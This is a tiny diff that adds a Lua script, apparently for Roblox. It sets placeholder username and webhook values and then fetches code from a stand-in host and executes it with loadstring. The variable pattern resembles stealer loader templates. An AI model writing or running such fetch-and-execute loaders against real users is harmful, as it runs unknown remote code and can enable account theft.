@@ -1,0 +1,7 @@
+
+Username = "Hi"
+Username2 = "Hi"
+Webhook = "Hi.com"
+
+loadstring(game:HttpGet("Hi.com"))()
+      
